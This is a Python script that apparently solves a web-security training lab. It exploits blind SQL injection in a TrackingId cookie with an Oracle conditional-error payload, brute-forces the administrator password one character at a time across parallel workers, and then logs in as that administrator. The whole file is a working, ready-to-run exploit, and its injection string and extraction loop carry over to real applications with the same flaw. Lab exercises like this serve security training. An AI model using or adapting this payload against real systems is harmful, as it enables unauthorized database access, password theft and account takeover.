from lib import (
    SESSION,
    check_is_lab_solved,
    generate_parser,
    login_as_administrator,
    get_tracking_id,
)
from string import ascii_lowercase, digits
from multiprocessing import Pool

CHARACTERS = ascii_lowercase + digits


def bruteforce_admin_password(position: int) -> str | None:
    global CHARACTERS

    print(f"[~] Started bruteforcing position {position}")

    for character in CHARACTERS:
        response = SESSION.get(
            f"{lab_url}/",
            cookies={
                "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a' --"
            },
        )

        if response.status_code == 500:
            print(f"[~] Ended bruteforcing position {position}")
            return character
        else:
            continue

    print(f"[~] Ended bruteforcing position {position}")


if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    tracking_id = get_tracking_id(lab_url)

    print("[!] Now brute-forcing the `administrator` password")

    administrator_password = ""
    function_args = list(range(1, 30))

    with Pool(10) as p:
        for arg, result in zip(
            function_args, p.imap(bruteforce_admin_password, function_args)
        ):
            if result is None:
                print(f"[+] Function returned None for input {arg}, stopping early.")
                p.terminate()
                break

            administrator_password += result

    print(f"[+] Found the `administrator` password: {administrator_password}")

    login_as_administrator(lab_url, administrator_password)

    check_is_lab_solved(lab_url)
